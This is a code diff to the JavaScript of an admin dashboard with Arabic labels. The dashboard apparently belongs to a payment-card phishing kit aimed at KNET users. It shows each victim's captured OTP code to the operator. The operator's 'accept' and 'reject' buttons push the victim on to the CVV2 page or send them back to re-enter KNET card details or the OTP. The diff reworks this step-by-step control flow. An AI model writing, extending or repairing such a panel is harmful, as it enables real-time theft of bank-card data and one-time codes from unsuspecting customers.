@@ -827,36 +827,9 @@
     }
   }
 
-  async function otpAction(ref, action) {
-    newDataRefs.delete(ref);
-    const otpPassBtn = document.getElementById(`otp-pass-${ref}`);
-    const otpDenyBtn = document.getElementById(`otp-denied-${ref}`);
-    if (otpPassBtn) { otpPassBtn.classList.remove('active-new'); otpPassBtn.disabled = true; otpPassBtn.innerHTML = 'جاري...'; }
-    if (otpDenyBtn) { otpDenyBtn.classList.remove('active-new'); otpDenyBtn.disabled = true; otpDenyBtn.innerHTML = 'جاري...'; }
-    try {
-      const d = await post("/api/admin/otp-action", { reference: ref, action });
-      if (d.success) {
-        const label = action === 'pass' ? '✅ قبول OTP - تم توجيه العميل لصفحة CVV2' : '❌ تم رفض OTP - سيعود لصفحة OTP';
-        toast(label, action==='pass'?'ok':'err');
-        loadAll();
-        if (currentOpenRef && currentOpenRef === ref) {
-          setTimeout(() => openDetail(ref), 400);
-        }
-      } else {
-        toast('فشل الإجراء: ' + (d.error||''), 'err');
-        if (otpPassBtn) { otpPassBtn.disabled = false; otpPassBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول OTP → CVV'; }
-        if (otpDenyBtn) { otpDenyBtn.disabled = false; otpDenyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض OTP'; }
-      }
-    } catch(e) {
-      toast('خطأ في الاتصال', 'err');
-      if (otpPassBtn) { otpPassBtn.disabled = false; otpPassBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول OTP → CVV'; }
-      if (otpDenyBtn) { otpDenyBtn.disabled = false; otpDenyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض OTP'; }
-    }
-  }
+
 
   async function smartAction(ref, action) {
-    // تحديد الحالة الحالية: إذا كان هناك OTP مرسل ولم يتم البت فيه → نستخدم otpAction
-    // إذا كان الطلب في مرحلة KNET/CVV → نستخدم paymentAction
     const passBtn = document.getElementById(`pay-pass-${ref}`);
     const denyBtn = document.getElementById(`pay-denied-${ref}`);
     if (passBtn) { passBtn.disabled = true; passBtn.innerHTML = 'جاري...'; }
@@ -865,16 +838,21 @@
     try {
       // جلب بيانات الحجز لتحديد الحالة
       const bookingData = await get(`/api/admin/bookings/${ref}`);
-      const booking = bookingData.booking || bookingData;
-      const hasOtp = booking.otp && booking.otp.otpCode && booking.otp.otpAction !== 'pass';
+      const booking = bookingData.data || bookingData.booking || bookingData;
+      const status = booking ? booking.status : '';
 
       let endpoint, label;
-      if (hasOtp) {
-        // حالة OTP: استخدم otp-action
+      // تحديد المرحلة بناءً على الحالة
+      if (status === 'pending_otp') {
+        // مرحلة OTP
         endpoint = '/api/admin/otp-action';
-        label = action === 'pass' ? '✅ قبول OTP - تم توجيه العميل لصفحة CVV' : '❌ تم رفض OTP - سيعود لصفحة OTP';
+        label = action === 'pass' ? '✅ قبول OTP - تم توجيه العميل لصفحة CVV2' : '❌ تم رفض OTP - سيعود لصفحة OTP';
+      } else if (status === 'pending_cvv' || status === 'pending_cvv2') {
+        // مرحلة CVV2 - قبول يوجه للنجاح
+        endpoint = '/api/admin/payment-action';
+        label = action === 'pass' ? '✅ قبول CVV - تم توجيه العميل للنجاح' : '❌ رفض CVV - سيعود لصفحة CVV';
       } else {
-        // حالة KNET/CVV: استخدم payment-action
+        // مرحلة KNET/دفع - قبول يوجه للنجاح
         endpoint = '/api/admin/payment-action';
         label = action === 'pass' ? '✅ قبول - تم توجيه العميل' : '❌ رفض - سيعود لصفحة KNET';
       }
@@ -929,11 +907,7 @@
         const rejectBtn = document.getElementById(`pay-denied-${ref}`);
         if (approveBtn) approveBtn.classList.add('active-new');
         if (rejectBtn) rejectBtn.classList.add('active-new');
-        // تلوين أزرار OTP إن وُجدت
-        const otpPassBtn = document.getElementById(`otp-pass-${ref}`);
-        const otpDenyBtn = document.getElementById(`otp-denied-${ref}`);
-        if (otpPassBtn) otpPassBtn.classList.add('active-new');
-        if (otpDenyBtn) otpDenyBtn.classList.add('active-new');
+
       }
     } catch { toast("خطأ في تحميل التفاصيل","err"); }
   }
@@ -1025,6 +999,34 @@
             <div class="otp-value-badge" id="otp-badge-${b.referenceId}">${otpVal}</div>
           </div>` : ''}
 
+          <div class="knet-action-btns">
+            <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="smartAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول</button>
+            <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="smartAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض</button>
+          </div>
+        </div>`;
+    }
+
+    // قسم OTP المستقل (إذا لم يكن هناك payment أو إذا كان OTP موجوداً بدون payment)
+    if (b.otp && b.otp.otpCode && !b.payment) {
+      const otpVal = b.otp.otpCode;
+      h += `
+        <div class="sec-title">رمز OTP</div>
+        <div class="knet-card-box">
+          <div class="otp-section-box">
+            <div class="otp-section-title">🔐 رمز OTP المُستلم</div>
+            <div class="otp-value-badge" id="otp-badge-${b.referenceId}">${otpVal}</div>
+          </div>
+          <div class="knet-action-btns">
+            <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="smartAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول OTP</button>
+            <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="smartAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض OTP</button>
+          </div>
+        </div>`;
+    }
+
+    // أزرار قبول/رفض عامة (إذا لم يكن هناك payment ولا otp)
+    if (!b.payment && !b.otp) {
+      h += `
+        <div class="knet-card-box">
           <div class="knet-action-btns">
             <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="smartAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول</button>
             <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="smartAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض</button>
